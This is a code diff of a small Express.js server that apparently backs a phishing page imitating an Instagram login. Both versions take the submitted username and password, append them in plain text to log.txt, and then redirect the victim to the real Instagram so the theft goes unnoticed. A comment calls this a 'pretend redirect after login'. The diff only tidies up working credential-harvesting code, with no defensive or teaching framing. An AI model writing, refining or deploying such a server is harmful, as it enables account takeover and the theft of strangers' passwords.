@@ -1,35 +1,24 @@
-const express = require('express');
-const fs = require('fs');
-const path = require('path');
-const bodyParser = require('body-parser');
-
+const express = require("express");
+const fs = require("fs");
+const path = require("path");
 const app = express();
-const PORT = process.env.PORT || 10000;
 
-// Middleware to parse form data
-app.use(bodyParser.urlencoded({ extended: false }));
+app.use(express.urlencoded({ extended: true }));
+app.use(express.static("public")); // serves HTML/CSS/JS from public folder
 
-// Serve static files (like index.html)
-app.use(express.static(path.join(__dirname, 'public')));
-
-// Handle login POST request
-app.post('/login', (req, res) => {
+app.post("/login", (req, res) => {
   const { username, password } = req.body;
-
   const logData = `Username: ${username} | Password: ${password}\n`;
 
-  fs.appendFile('log.txt', logData, (err) => {
+  fs.appendFile("log.txt", logData, (err) => {
     if (err) {
-      console.error('❌ Failed to write to log.txt', err);
-    } else {
-      console.log('✅ Logged credentials');
+      console.error("Failed to write to log.txt");
     }
   });
 
-  // Redirect to real Instagram or show "Login Failed"
-  res.redirect('https://instagram.com');
+  res.redirect("https://instagram.com"); // pretend redirect after login
 });
 
-app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
+app.listen(10000, () => {
+  console.log("Server running on port 10000");
 });
